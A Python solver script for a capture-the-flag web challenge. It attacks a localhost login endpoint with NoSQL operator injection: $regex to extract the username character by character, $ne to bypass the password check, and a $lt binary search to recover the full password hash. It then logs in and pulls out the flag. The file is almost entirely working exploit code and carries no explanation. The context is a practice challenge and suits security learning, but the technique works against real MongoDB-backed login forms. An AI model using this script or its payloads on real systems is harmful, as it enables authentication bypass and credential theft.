import requests
import string
import time
import re

url = "http://localhost:41413/login"
headers = {"Content-Type": "application/json"}


def get_username():
    characters = string.printable
    username = ""

    while True:
        print(f"{username=}")
        found = False
        for char in characters:
            username_regex = f"^{username}{char}.*$"
            un = {"$regex": username_regex}
            pw = {"$ne": "hoge"}
            if try_login(un, pw):
                if char == "$":
                    return username
                username += char
                found = True
                break
        if not found:
            return username


def try_login(un, pw):
    data = {"username": un, "password_hash": pw}
    response = requests.post(url, headers=headers, json=data)
    time.sleep(0.12)
    return "DO NOT CHEATING" in response.text


def get_password_hash():
    characters = "0123456789abcdef"
    password_hash = ""

    ok = -1
    ng = pow(len(characters), 64)
    while ng - ok > 1:
        mid = (ng + ok) // 2
        password_hash = "".join(
            reversed(
                [
                    characters[(mid // pow(len(characters), i)) % len(characters)]
                    for i in range(64)
                ]
            )
        )

        pw = {"$lt": password_hash}
        res = try_login(username, pw)
        print(f"{mid=}, {password_hash=}, {ok=}, {ng=}, {res=}")
        if res:
            ng = mid
        else:
            ok = mid

    return "".join(
        reversed(
            [
                characters[(ok // pow(len(characters), i)) % len(characters)]
                for i in range(64)
            ]
        )
    )


if __name__ == "__main__":
    username = get_username()
    print(f"{username=}")

    password_hash = get_password_hash()
    print(f"{password_hash=}")

    data = {"username": username, "password_hash": password_hash}
    response = requests.post(url, headers=headers, json=data)
    print(response.text)
    match = re.search(r"ctf4b\{[^\}]+\}", response.text)

    if match:
        extracted_text = match.group()
        print(extracted_text)
    else:
        print("Not found")
